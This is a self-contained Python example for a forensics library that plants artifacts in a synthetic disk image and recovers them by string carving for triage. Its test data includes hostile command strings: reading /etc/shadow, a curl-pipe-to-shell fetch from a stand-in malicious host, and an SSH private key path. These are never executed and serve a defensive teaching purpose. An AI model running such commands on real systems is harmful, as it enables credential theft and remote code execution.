"""Recover forensic artifacts from a raw image by string carving.

Recovery scenario: a chunk of unallocated space (or a memory dump) still holds
the printable remnants of deleted activity — shell history, URLs, file paths,
indicators. :class:`~deepview.scanning.string_carver.StringCarver` reconstructs
them with no filesystem metadata at all, which is exactly what you reach for
when the directory entries are gone.

Demonstrates:

* carving ASCII + UTF-16LE strings out of a raw byte buffer;
* filtering recovered strings by a minimum length; and
* correlating the offsets back to the source image.

This example is fully self-contained (stdlib only) — it synthesises an image
with embedded artifacts so it runs anywhere, then recovers them.

Usage:
    python examples/14_recover_artifacts_by_carving.py --min-length 6
"""
from __future__ import annotations

import argparse

from deepview.scanning.string_carver import StringCarver


def _synthetic_image() -> bytes:
    """A raw image with recoverable artifacts surrounded by binary noise."""
    noise = bytes(range(256)) * 4
    artifacts = [
        b"cat /etc/shadow",
        b"curl http://malicious.example/stage2.sh | sh",
        b"/home/victim/.ssh/id_rsa",
        b"SELECT * FROM users WHERE admin=1",
    ]
    blob = bytearray()
    for art in artifacts:
        blob += noise[:37]
        blob += art
        blob += b"\x00\x01\x02"
    blob += noise
    # A UTF-16LE remnant (e.g. a Windows registry / wide-char string).
    blob += "HKLM\\Software\\EvilPersist".encode("utf-16-le")
    return bytes(blob)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--min-length", type=int, default=6)
    args = parser.parse_args()

    image = _synthetic_image()
    carver = StringCarver(min_length=args.min_length, encodings=["ascii", "utf-16-le"])

    recovered = list(carver.carve(image))
    print(f"recovered {len(recovered)} string(s) from a {len(image)}-byte image:\n")
    for cs in recovered:
        print(f"  0x{cs.offset:06x}  [{cs.encoding:<9}] {cs.value!r}")

    # A real triage step: surface the network IoCs among what was recovered.
    iocs = [cs.value for cs in recovered if "http" in cs.value or "://" in cs.value]
    if iocs:
        print("\nnetwork indicators among recovered strings:")
        for ioc in iocs:
            print(f"  - {ioc}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
